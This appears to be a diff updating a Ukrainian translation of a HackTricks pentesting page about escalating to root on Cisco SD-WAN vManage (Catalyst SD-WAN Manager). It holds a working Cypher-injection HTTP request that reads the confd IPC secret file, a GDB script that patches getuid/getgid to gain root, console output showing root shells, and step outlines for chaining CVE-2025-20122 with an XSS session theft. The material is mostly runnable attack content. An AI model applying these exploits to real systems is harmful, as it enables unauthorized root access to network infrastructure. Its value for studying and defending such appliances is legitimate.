@@ -2,11 +2,11 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Path 1
+## Шлях 1
 
 (Приклад з [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))
 
-Після деякого дослідження [документації](http://66.218.245.39/doc/html/rn03re18.html), пов'язаної з `confd` та різними бінарними файлами (доступними з обліковим записом на сайті Cisco), ми виявили, що для автентифікації IPC сокета використовується секрет, розташований у `/etc/confd/confd_ipc_secret`:
+Після невеликого вивчення деякої [documentation](http://66.218.245.39/doc/html/rn03re18.html), пов'язаної з `confd` та різними бінарними файлами (доступними з обліковим записом на сайті Cisco), ми виявили, що для аутентифікації IPC socket він використовує секрет, розташований у `/etc/confd/confd_ipc_secret`:
 ```
 vmanage:~$ ls -al /etc/confd/confd_ipc_secret
 
@@ -14,7 +14,7 @@ vmanage:~$ ls -al /etc/confd/confd_ipc_secret
 ```
 Пам'ятаєте наш екземпляр Neo4j? Він працює під привілеями користувача `vmanage`, що дозволяє нам отримати файл, використовуючи попередню вразливість:
 ```
-GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1
+GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1
 
 Host: vmanage-XXXXXX.viptela.net
 
@@ -24,7 +24,7 @@ Host: vmanage-XXXXXX.viptela.net
 
 "data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
 ```
-Програма `confd_cli` не підтримує аргументи командного рядка, але викликає `/usr/bin/confd_cli_user` з аргументами. Отже, ми можемо безпосередньо викликати `/usr/bin/confd_cli_user` з нашим власним набором аргументів. Однак вона недоступна для читання з нашими поточними привілеями, тому нам потрібно отримати її з rootfs і скопіювати за допомогою scp, прочитати допомогу та використовувати її для отримання оболонки:
+Програма `confd_cli` не підтримує аргументи командного рядка, але викликає `/usr/bin/confd_cli_user` з аргументами. Отже, ми можемо напряму викликати `/usr/bin/confd_cli_user` з нашим набором аргументів. Проте вона недоступна для читання з нашими поточними привілеями, тому нам потрібно витягти її з rootfs і скопіювати за допомогою scp, переглянути help і використати її, щоб отримати shell:
 ```
 vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret
 
@@ -42,14 +42,17 @@ vManage:~# id
 
 uid=0(root) gid=0(root) groups=0(root)
 ```
-## Path 2
+## Шлях 2
 
 (Приклад з [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))
 
-Блог¹ команди synacktiv описав елегантний спосіб отримати root shell, але є застереження: потрібно отримати копію `/usr/bin/confd_cli_user`, яка доступна лише для читання root. Я знайшов інший спосіб підвищити привілеї до root без таких труднощів.
+Блог¹ команди synacktiv описував елегантний спосіб отримати root shell, але зауваження в тому, що для цього потрібно отримати копію `/usr/bin/confd_cli_user`, яка доступна для читання лише root. Я знайшов інший спосіб піднятися до root без таких клопотів.
 
-Коли я розібрав бінарний файл `/usr/bin/confd_cli`, я спостерігав наступне:
-```
+Коли я дизасемблював бінарний файл `/usr/bin/confd_cli`, я помітив наступне:
+
+<details>
+<summary>Objdump, що показує збір UID/GID</summary>
+```asm
 vmanage:~$ objdump -d /usr/bin/confd_cli
 … snipped …
 40165c: 48 89 c3              mov    %rax,%rbx
@@ -77,20 +80,22 @@ vmanage:~$ objdump -d /usr/bin/confd_cli
 4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
 … snipped …
 ```
-Коли я запускаю “ps aux”, я спостерігав наступне (_note -g 100 -u 107_)
+</details>
+
+Коли я запускаю “ps aux”, я побачив наступне (_примітка -g 100 -u 107_)
 ```
 vmanage:~$ ps aux
 … snipped …
 root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
 … snipped …
 ```
-Я припустив, що програма “confd_cli” передає ідентифікатор користувача та ідентифікатор групи, які вона отримала від увійшовшого користувача, додатку “cmdptywrapper”.
+Я припустив, що програма “confd_cli” передає ідентифікатор користувача та ідентифікатор групи, які вона отримала від залогіненого користувача, до застосунку “cmdptywrapper”.
 
-Моя перша спроба полягала в тому, щоб запустити “cmdptywrapper” безпосередньо і передати йому `-g 0 -u 0`, але це не вдалося. Схоже, що десь на шляху був створений дескриптор файлу (-i 1015), і я не можу його підробити.
+Моя перша спроба була запустити “cmdptywrapper” безпосередньо й передати йому `-g 0 -u 0`, але це не вдалося. Схоже, десь по дорозі було створено дескриптор файлу (-i 1015), який я не можу підробити.
 
-Як згадувалося в блозі synacktiv (останній приклад), програма `confd_cli` не підтримує аргументи командного рядка, але я можу вплинути на неї за допомогою налагоджувача, і на щастя, GDB включено в систему.
+Як зазначено в блозі synacktiv (останній приклад), програма `confd_cli` не підтримує аргументи командного рядка, але я можу впливати на неї через відлагоджувач, і на щастя GDB встановлено в системі.
 
-Я створив скрипт GDB, в якому змусив API `getuid` і `getgid` повертати 0. Оскільки я вже маю привілей “vmanage” через десеріалізацію RCE, я маю дозвіл на безпосереднє читання `/etc/confd/confd_ipc_secret`.
+Я створив GDB-скрипт, в якому змусив API `getuid` і `getgid` повертати 0. Оскільки я вже маю привілеї “vmanage” через deserialization RCE, у мене є дозвіл безпосередньо читати `/etc/confd/confd_ipc_secret`.
 
 root.gdb:
 ```
@@ -110,8 +115,11 @@ root
 end
 run
 ```
-Вихід консолі:
-```
+Вивід консолі:
+
+<details>
+<summary>Вивід консолі</summary>
+```text
 vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
 GNU gdb (GDB) 8.0.1
 Copyright (C) 2017 Free Software Foundation, Inc.
@@ -144,4 +152,25 @@ root
 uid=0(root) gid=0(root) groups=0(root)
 bash-4.4#
 ```
+</details>
+
+## Path 3 (2025 CLI input validation bug)
+
+Cisco перейменувала vManage на *Catalyst SD-WAN Manager*, але підлеглий CLI все ще працює на тій самій машині. Офіційне повідомлення 2025 року (CVE-2025-20122) описує недостатню валідацію вводу в CLI, яка дозволяє **any authenticated local user** отримати root, відправивши сформований запит до сервісу manager CLI. Поєднайте будь-який низькопривілейний доступ (наприклад, Neo4j deserialization з Path1 або shell для cron/backup користувача) з цією вразливістю, щоб піднятися до root без копіювання `confd_cli_user` або прикріплення GDB:
+
+1. Використайте свій низькопривілейний shell, щоб знайти CLI IPC endpoint (зазвичай слухач `cmdptywrapper`, показаний на порту 4565 в Path2).
+2. Сформуйте CLI-запит, що підробляє поля UID/GID в 0. Баг валідації не примушує використовувати UID початкового виклику, тож wrapper запускає root-backed PTY.
+3. Пропустіть будь-яку послідовність команд (`vshell; id`) через підроблений запит, щоб отримати root shell.
+
+> The exploit surface is local-only; remote code execution is still required to land the initial shell, but once inside the box exploitation is a single IPC message rather than a debugger-based UID patch.
+
+## Other recent vManage/Catalyst SD-WAN Manager vulns to chain
+
+* **Authenticated UI XSS (CVE-2024-20475)** – Inject JavaScript in specific interface fields; stealing an admin session gives you a browser-driven path to `vshell` → local shell → Path3 for root.
+
+## References
+
+- [Cisco Catalyst SD-WAN Manager Privilege Escalation Vulnerability (CVE-2025-20122)](https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-sdwan-priviesc-WCk7bmmt.html)
+- [Cisco Catalyst SD-WAN Manager Cross-Site Scripting Vulnerability (CVE-2024-20475)](https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-sdwan-xss-zQ4KPvYd.html)
+
 {{#include ../../banners/hacktricks-training.md}}
